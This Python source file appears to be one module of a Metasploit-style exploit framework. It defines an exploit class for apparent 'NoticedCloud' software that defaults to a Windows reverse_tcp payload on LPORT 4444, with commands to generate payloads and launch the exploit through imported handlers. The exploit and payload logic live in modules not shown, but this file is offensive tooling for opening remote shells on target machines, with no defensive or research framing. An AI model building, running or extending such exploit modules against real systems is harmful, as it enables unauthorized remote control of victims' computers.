import os
import importlib
from base64 import b64encode
from Lib.Debugger import info, warning, error
from ._NCEXPlib.payload_utils import payload_gen
from ._NCEXPlib.socket_handler import exploit_handler

class NCEXP:
    def __init__(self) -> None:
        info("No payload selected. Setting payload to Windows/NoticedCloud/reverse_tcp")
        self.LHOST: str = "0.0.0.0"
        self.EXPLOIT: str = "Server/Exploits/NoticedCloud/"
        self.LPORT: int = 4444
        self.payload: str = "Server/Payloads/Windows/NoticedCloud/reverse_tcp"
        self.commands: dict = {
            "exploit": "runs the exploit",
            "run": "runs the exploit",
            "payload_gen": "generates a payload"
        }

    def exec(self, command: str) -> any:
        if command.startswith("payload_gen"):
            return payload_gen(self, command)
        elif command in ["exploit", "run"]:
            return exploit_handler(self)
        else:
            return 1
    
    def set(self, *args, **kwargs) -> None:
        if "payload" in args[0]:
            if os.path.exists("Server/Payloads/"+args[0]["payload"]+".py"):
                self.payload: str = "Server/Payloads/"+args[0]["payload"]
                info(f"Payload set to {self.payload}")
            else:
                payload = args[0]["payload"]
                error(f"Payload {payload} does not exist")

        elif "lhost" in args[0]:
            self.LHOST = args[0]["lhost"]
            info(f"LHOST set to {self.LHOST}")
        elif "lport" in args[0]:
            try:
                self.LPORT = int(args[0]["lport"])
            except:
                error(f"Invalid LPORT {self.LPORT}")
        else:
            warning("Argument not valid")
    
    def get_options(self) -> dict:
        return {
            "lhost": self.LHOST,
            "lport": self.LPORT,
            "payload": self.payload[16:]
        }
    
    def options(self) -> None:
        print(f"""
{'CONTENT':<12} {'VALUE':<15} {'REQUIRED':<10}

{'-----------':<12} {'---------------':<15} {'----------':<10}

{'LHOST':<12} {self.LHOST:<15} {'True':>10}
{'LPORT':<12} {self.LPORT:<15} {'True':>10}

{'PAYLOAD':<12} {self.payload[16:]}
""")
